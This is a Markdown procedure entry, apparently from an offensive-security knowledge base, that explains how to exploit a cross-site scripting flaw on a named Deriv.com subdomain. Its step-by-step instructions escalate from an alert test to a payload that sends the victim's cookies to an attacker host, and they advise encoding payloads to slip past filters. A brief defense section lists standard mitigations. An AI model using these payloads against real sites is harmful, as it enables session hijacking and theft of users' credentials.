---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
name: Inject-and-Execute-Malicious-JavaScript-via-XSS
tags:
  - xss
  - injection
  - javascript
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:53.326Z'
skill_level: beginner
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-and-Execute-Malicious-JavaScript-via-XSS

## Summary

This procedure outlines the identification and exploitation of a cross-site scripting (XSS) vulnerability, as reported in a Deriv.com subdomain. By injecting malicious JavaScript into unsanitized input fields or parameters, an attacker can execute arbitrary code in the victim's browser, potentially leading to session theft, phishing, or data exfiltration. The vulnerability was validated and rewarded by Deriv.com via HackerOne in 2016.

## Description

In the context of the Deriv.com subdomain, the XSS flaw allows user-supplied input to be reflected or stored without proper escaping, enabling JavaScript execution. This is a classic reflected or stored XSS scenario where attackers craft payloads to run in the context of the legitimate site, bypassing same-origin policy restrictions. Expected outcomes include popup alerts for proof-of-concept, or more advanced actions like keylogging or credential harvesting. Prerequisites include access to a web browser and knowledge of common XSS payloads; no special tools are required for basic testing.

## Requirements

1. Access to the target web application (e.g., Deriv.com subdomain)
2. Ability to interact with input mechanisms like forms, search bars, or URL parameters
3. Basic understanding of HTML and JavaScript for payload crafting

## Defense

Defensive measures and detection strategies:

- Implement content security policy (CSP) to restrict script sources
- Use output encoding (e.g., HTML entity encoding) for all user inputs
- Employ web application firewalls (WAFs) to detect and block common XSS payloads
- Regularly scan for vulnerabilities using tools like OWASP ZAP or manual testing

## Objectives

1. Confirm the presence of an XSS vulnerability by executing a benign payload
2. Demonstrate potential impact through script execution in a victim browser
3. Highlight remediation needs for input validation and sanitization

## Instructions

### Step 1: Identify Vulnerable Input Point

**Context**: Locate areas in the web application where user input is reflected back without sanitization, such as URL parameters, form fields, or error messages.

Navigate to the target subdomain (e.g., via https://subdomain.deriv.com) and inspect pages for input opportunities. Test by appending a simple string like "test" to a parameter and see if it's echoed back raw.

### Step 2: Test for XSS with Basic Payload

**Context**: Inject a proof-of-concept payload to verify if JavaScript can execute.

Use the browser's address bar or a form to submit: `<script>alert('XSS')</script>`. If an alert box appears, the vulnerability is confirmed.

### Step 3: Craft and Execute Malicious Payload

**Context**: Escalate to a payload that achieves the attack objective, such as exfiltrating session data.

Replace the alert with: `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>`. Submit and observe if a network request is made to the attacker server, indicating successful execution.

> Note: In a real scenario, encode the payload to bypass basic filters (e.g., using `&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;`). Monitor browser console for errors or successful script runs.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[web]]
- [[injection]]
